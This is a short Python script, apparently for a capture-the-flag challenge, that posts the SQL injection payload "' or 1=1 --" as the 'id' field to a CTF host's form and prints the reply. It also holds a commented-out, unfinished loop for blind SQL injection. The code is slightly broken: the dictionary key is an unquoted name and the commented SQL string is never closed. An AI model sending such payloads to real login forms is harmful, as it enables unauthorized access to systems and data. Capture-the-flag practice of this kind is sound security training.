import requests

url = 'http://ctfq.sweetduet.info:10080/~q6/'
payload = {id: "' or 1=1 --"}
print(payload)
# for i in range(1,100):
#     # customize sql
#     sql = 'admin\' AND (SELECT )
#     payload = {
#         id: sql,
#     }

response = requests.post(url,data=payload)
print(response.text)